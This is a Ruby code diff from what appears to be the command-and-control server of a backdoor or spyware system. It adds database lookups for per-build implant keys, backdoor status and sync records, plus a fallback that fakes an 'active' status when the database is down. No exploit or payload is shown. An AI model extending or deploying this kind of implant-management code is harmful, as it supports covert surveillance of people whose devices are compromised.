@@ -24,7 +24,8 @@ class DB
   ACTIVE_BACKDOOR = 0
   DELETED_BACKDOOR = 1
   CLOSED_BACKDOOR = 2
-  NO_SUCH_BACKDOOR = 3
+  QUEUED_BACKDOOR = 3
+  NO_SUCH_BACKDOOR = 4
   
   attr_reader :backdoor_signature
 
@@ -103,16 +104,35 @@ class DB
   end
 
   def class_key_of(build_id)
+    # if we already have it return otherwise we have to ask to the db
     return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
+
+    trace :debug, "Cache Miss: class key for #{build_id}"
+    
+    # ask to the db the class key
+    key = @db.class_keys build_id
+
+    # save the class key in the memory cache
+    @class_keys[build_id] = Digest::MD5.digest key unless key.nil?
+
+    #TODO: store it in the permanent cache
   end
 
+  # returns ALWAYS the status of a backdoor
   def status_of(build_id, instance_id, subtype)
-    #TODO: real query
-    return ACTIVE_BACKDOOR, 0
+    # if the database has gone, reply with a fake response in order for the sync to continue
+    return ACTIVE_BACKDOOR, 0 if not @available
+
+    # ask the database the status of the backdoor
+    return @db.status_of(build_id, instance_id, subtype)
   end
 
   def sync_for(bid, version, user, device, source, time)
-    #TODO: implement
+    # database is down, continue
+    return if not @available
+
+    # tell the db that the backdoor has synchronized
+    @db.sync_for bid, version, user, device, source, time
   end
 
   def new_conf?(bid)
@@ -126,7 +146,7 @@ class DB
 
   def new_uploads?(bid)
     #TODO: implement
-    return true
+    return false
   end
   def new_uploads(bid)
     #TODO: implement
@@ -135,7 +155,7 @@ class DB
 
   def new_downloads?(bid)
     #TODO: implement
-    return true
+    return false
   end
   def new_downloads(bid)
     #TODO: implement
@@ -144,7 +164,7 @@ class DB
 
   def new_filesystems?(bid)
     #TODO: implement
-    return true
+    return false
   end
   def new_filesystems(bid)
     #TODO: implement
